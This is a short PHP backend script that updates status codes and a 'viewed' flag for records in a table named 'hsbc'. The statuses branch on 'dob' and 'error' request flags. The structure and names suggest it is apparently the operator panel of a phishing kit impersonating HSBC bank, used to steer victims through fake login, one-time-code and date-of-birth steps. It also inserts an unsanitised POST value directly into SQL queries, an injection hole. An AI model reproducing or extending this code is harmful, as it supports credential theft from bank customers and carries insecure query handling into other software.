<?php
require '../connection.php';

if ($_POST["uniqueid"]) {
  $uniqueid = $_POST["uniqueid"];

  if (isset($_GET["dob"])) {
    if (isset($_GET["error"])) {
      $upload_login_code = mysqli_query($conn, "UPDATE hsbc SET status=5, viewed='true' WHERE uniqueid=$uniqueid");
    } else {
      $upload_login_code = mysqli_query($conn, "UPDATE hsbc SET status=3, viewed='true' WHERE uniqueid=$uniqueid");
    }
  } else {
    if (isset($_GET["error"])) {
      $upload_login_code = mysqli_query($conn, "UPDATE hsbc SET status=4, viewed='true' WHERE uniqueid=$uniqueid");
    } else {
      $upload_login_code = mysqli_query($conn, "UPDATE hsbc SET status=2, viewed='true' WHERE uniqueid=$uniqueid");
    }
  }

  if ($upload_login_code) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
